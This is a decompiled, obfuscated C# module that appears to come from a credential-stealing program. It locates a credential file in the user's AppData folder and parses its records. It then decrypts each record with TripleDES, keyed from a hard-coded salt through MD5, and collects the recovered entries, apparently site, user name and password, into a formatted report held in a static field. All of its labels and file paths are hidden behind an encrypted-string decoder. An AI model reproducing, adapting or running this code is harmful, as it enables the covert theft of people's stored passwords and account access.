using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class29
{
	public class Class30
	{
		private static byte[] byte_0 = new byte[11]
		{
			131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
			255
		};

		private static byte[] byte_1 = new byte[4] { 0, 0, 0, 8 };

		private static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public string string_1;

		private int int_0;

		private int int_1;

		private int int_2;

		private bool bool_0;

		private string string_2;

		private string string_3;

		private string string_4;

		private string[] string_5;

		private string[] string_6;

		private string[] string_7;

		private int int_3;

		private bool bool_1;

		private string[] string_8;

		private string[] string_9;

		public Class30()
		{
			int_0 = 0;
			int_1 = 0;
			int_2 = 0;
			bool_0 = true;
			string_5 = new string[1001];
			string_6 = new string[1001];
			string_7 = new string[1001];
			int_3 = 0;
			bool_1 = false;
			string_9 = new string[3001];
		}

		public object method_0()
		{
			List<string> list = new List<string>();
			string[] array = (string[])method_1();
			try
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (Operators.CompareString(text, "", false) != 0)
					{
						list.Add(text);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			StringBuilder stringBuilder = new StringBuilder();
			object result = default(object);
			try
			{
				string text2;
				if (list.Count == 0)
				{
					text2 = Class9.smethod_0("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + "\r\n" + Class9.smethod_0("P4ezr65+WKizsIWdtWqfjK2vrlyLp7dqnoJYta+fjK6ovKGBZGO5rj2sq69ckquovFyBoadqqoysY7Kdk51jmayCqqRqpYurt6uoiZ2neC0=", "False") + "\r\n" + Class9.smethod_0("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False");
					return result;
				}
				int num = list.Count - 1;
				for (int j = 0; j <= num; j += 3)
				{
					stringBuilder.Append(Class9.smethod_0("jM7d5Z1kAw==", "False") + list[j].Substring(1)).AppendLine();
					stringBuilder.Append(Class9.smethod_0("kcrH23uKuM/OlVwL", "False") + list[j + 1].Substring(1)).AppendLine();
					stringBuilder.Append(Class9.smethod_0("j7vY39WuzMmmfgc=", "False") + list[j + 2].Substring(1)).AppendLine();
					stringBuilder.Append(Class9.smethod_0("YXyHjoBhfIeOgGF8h46AYXyHjoBhfIeOgGF8h46AYXwk", "False")).AppendLine();
				}
				text2 = (Class29.string_0 = Class9.smethod_0("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + "\r\n" + stringBuilder.ToString() + "\r\n" + Class9.smethod_0("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False"));
				return result;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public object method_1()
		{
			try
			{
				if (File.Exists(string_0 + Class9.smethod_0("hZO/u7qKoJ7GrZulq82pl6h9uqmdHg==", "False")))
				{
					string_0 += Class9.smethod_0("coCsqKd3jYuzmoiSmLqWhJVqp5aKMQ==", "False");
					method_2();
				}
				else if (File.Exists(string_0 + Class9.smethod_0("f425tbSEmpjAp5WfpcC0kqSyvKd/taq+plGiqsQn", "False")))
				{
					string_0 += Class9.smethod_0("jZvHw8KSqKbOtaOts87CoLLAyrWNw7jMtF+wuNIZ", "False");
					method_2();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return string_9;
		}

		private void method_2()
		{
			try
			{
				byte[] array = File.ReadAllBytes(string_0);
				int num = 0;
				int num2 = array.Length - 5;
				for (int i = 0; i <= num2; i++)
				{
					if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
					{
						num = array[i + 15];
						byte[] array2 = new byte[8];
						byte[] array3 = new byte[num - 1 + 1];
						Array.Copy(array, i + 4, array2, 0, array2.Length);
						Array.Copy(array, i + 16, array3, 0, array3.Length);
						string_1 = Conversions.ToString(Operators.AddObject((object)string_1, Operators.ConcatenateObject(method_3(array2, array3), (object)"\r\n")));
						i += 11 + num;
					}
				}
				string_8 = string_1.Split(new char[1] { Conversions.ToChar(Environment.NewLine) });
				int num3 = 0;
				do
				{
					string_8[num3] = null;
					num3++;
				}
				while (num3 <= 3);
				int num4 = string_8.Length - 1;
				for (int j = 0; j <= num4; j++)
				{
					string_2 = null;
					string_3 = null;
					string_4 = null;
					int_0 = 0;
					if (!string_8[j].Contains(Class9.smethod_0("rtXg4591kAI=", "False")) && !string_8[j].Contains(Class9.smethod_0("kbjDxrtjc34g", "False")) && !string_8[j].Contains(Class9.smethod_0("lb7Fln1eGA==", "False")))
					{
						if (bool_1)
						{
							if (j - int_3 == 1 || j - int_3 == 2)
							{
								int num5 = string_8[j].Length - 1;
								for (int k = 0; k <= num5; k++)
								{
									if (string_8[j][k - int_0] > '\u007f')
									{
										string_8[j] = string_8[j].Remove(k - int_0, 1);
										int_0++;
									}
								}
								if (j - int_3 == 1)
								{
									string_3 = string_8[j];
								}
								else if (j - int_3 == 2)
								{
									string_4 = string_8[j];
									int_1++;
									bool_1 = false;
								}
							}
						}
						else if (int_3 != 0 && (j == int_3 + 2 || j == int_3 + 4))
						{
							int num6 = string_8[j].Length - 1;
							for (int l = 0; l <= num6; l++)
							{
								if (string_8[j][l - int_0] > '\u007f')
								{
									string_8[j] = string_8[j].Remove(l - int_0, 1);
									int_0++;
								}
							}
							if (j == int_3 + 2)
							{
								string_3 = string_8[j];
							}
							else if (j == int_3 + 4)
							{
								string_4 = string_8[j];
								int_1++;
							}
						}
					}
					else if (j != 0)
					{
						int num7 = string_8[j].Length - 1;
						for (int m = 0; m <= num7; m++)
						{
							if (string_8[j][m - int_0] > '\u007f')
							{
								string_8[j] = string_8[j].Remove(m - int_0, 1);
								int_0++;
							}
						}
						if (j - int_3 == 1)
						{
							string_2 = string_8[j];
						}
						else if (j - int_3 == 2)
						{
							string_2 = string_8[j];
						}
						if (string_8[j].Contains(Class9.smethod_0("lb7Fln1eGA==", "False")))
						{
							string_2 = string_8[j];
						}
						int_3 = j;
					}
					if (Operators.CompareString(string_2, (string)null, false) != 0)
					{
						string_5[int_1] = string_2;
					}
					if (Operators.CompareString(string_3, (string)null, false) != 0)
					{
						string_6[int_1] = string_3;
					}
					if (Operators.CompareString(string_4, (string)null, false) != 0)
					{
						string_7[int_1 - 1] = string_4;
					}
				}
				int num8 = string_5.Length - 1;
				for (int n = 0; n <= num8 && Operators.CompareString(string_5[n], "", false) != 0; n++)
				{
					string_9[int_2] = string_5[n];
					string_9[int_2 + 1] = string_6[n];
					string_9[int_2 + 2] = string_7[n];
					int_2 += 3;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public object method_3(byte[] byte_2, byte[] byte_3)
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				mD5CryptoServiceProvider.Initialize();
				byte[] array = new byte[byte_0.Length + (byte_2.Length - 1) + 1];
				Array.Copy(byte_0, array, byte_0.Length);
				Array.Copy(byte_2, 0, array, byte_0.Length, byte_2.Length);
				byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
				array = new byte[array2.Length + byte_0.Length + (byte_2.Length - 1) + 1];
				Array.Copy(array2, array, array2.Length);
				Array.Copy(byte_0, 0, array, array2.Length, byte_0.Length);
				Array.Copy(byte_2, 0, array, array2.Length + byte_0.Length, byte_2.Length);
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				byte[] array3 = new byte[24];
				byte[] array4 = new byte[8];
				Array.Copy(array2, array3, array2.Length);
				Array.Copy(sourceArray, 0, array3, array2.Length, 8);
				Array.Copy(sourceArray, 8, array4, 0, 8);
				byte_2 = array3;
				tripleDESCryptoServiceProvider.IV = array4;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				byte[] bytes = cryptoTransform.TransformFinalBlock(byte_3, 0, byte_3.Length);
				return Encoding.Unicode.GetString(bytes);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
